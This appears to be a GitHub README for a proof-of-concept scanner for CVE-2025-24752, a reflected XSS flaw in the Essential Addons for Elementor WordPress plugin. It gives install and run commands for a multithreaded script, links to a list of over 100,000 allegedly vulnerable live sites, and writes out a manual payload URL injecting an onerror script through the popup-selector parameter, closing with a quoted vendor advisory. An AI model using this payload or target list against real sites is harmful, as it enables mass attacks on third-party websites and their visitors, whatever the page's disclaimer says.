Please do not harm sites, FIX it ASAP
targets vulnerable 100K+ probably affecting for XSS https://nt.ls/AkTE9 (can download by one click all vulnerable)

##### Requirement to run poc.py, Install -

```pip install selenium webdriver-manager```

##### Usage 
```python poc.py targets.txt 10```

```10 = amount of threads, i think 5 are default, depends on your RAM```

![image](https://github.com/user-attachments/assets/4167280d-787d-45cd-81eb-4a5c25368885)

#### manual POC elementor XSS 2025
 ==> ```https://target.com/?popup-selector=<img_src=x_onerror=alert("chirag")>&eael-lostpassword=1```

 
![image](https://github.com/user-attachments/assets/50d75f05-1392-4acf-9889-525e54ca5128)


Note: My script works slow, but it can 1000% confirm XSS bug unlike nuclei or httpx. I tried all the things, version below 6.0.15 are affected.

#### Information & reference 
https://patchstack.com/articles/reflected-xss-patched-in-essential-addons-for-elementor-affecting-2-million-sites/
The Essential Addons for Elementor plugin suffered from a reflected cross-site scripting (XSS) vulnerability. The vulnerability occurred due to insufficient validation and sanitizing of the popup-selector query argument, allowing for a malicious value to be reflected back at the user. The vulnerability is fixed in version 6.0.15 and has been tracked with CVE-2025-24752.
